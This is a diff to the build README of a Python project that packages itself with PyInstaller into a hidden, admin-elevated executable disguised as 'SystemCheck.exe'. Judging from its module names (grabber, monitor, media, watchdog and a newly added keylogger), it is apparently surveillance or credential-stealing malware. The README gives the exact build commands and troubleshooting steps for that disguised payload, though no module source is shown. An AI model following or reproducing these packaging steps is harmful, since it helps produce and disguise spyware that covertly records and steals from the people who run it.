@@ -1,14 +1,14 @@
-# 📦 BUILD EXECUTABLE (EXE) - V11
+# 📦 BUILD EXECUTABLE (EXE) - V12
 
-> **Version:** 11.0  
-> **Tool:** PyInstaller 6.17.0
+> **Version:** 12.0  
+> **Tool:** PyInstaller 6.1.0
 
 ---
 
 ## 🚀 Quick Build
 
 ```bash
-pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V11.py
+pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V12.py
 ```
 
 **Output:** `dist/SystemCheck.exe` (~75-80 MB with Python runtime)
@@ -45,10 +45,12 @@ del SystemCheck.spec
 
 ### Step 3: Build
 ```bash
-pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V11.py
+pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V12.py
 ```
 
-**PyInstaller automatically includes all imported modules** (config.py, utils.py, grabber.py, media.py, monitor.py).
+**PyInstaller automatically includes all imported modules** (config.py, utils.py, grabber.py, media.py, monitor.py, watchdog.py, keylogger.py).
+
+> **V12 note:** `watchdog.py` và `keylogger.py` là module mới — được include tự động qua import.
 
 ### Step 4: Verify Output
 ```bash
@@ -102,7 +104,7 @@ dir dist\SystemCheck.exe
 - Reinstall PyInstaller: `pip install --upgrade pyinstaller`
 
 **"Module not found"?**
-- Verify: `python -c "import V11"`
+- Verify: `python -c "import V12"`
 - Reinstall deps: `pip install -r requirements.txt`
 
 **EXE won't run?**
@@ -125,4 +127,4 @@ dir dist\SystemCheck.exe
 
 ---
 
-**Developer:** TsByin | **Version:** 10.0
+**Developer:** TsByin | **Version:** 12.0
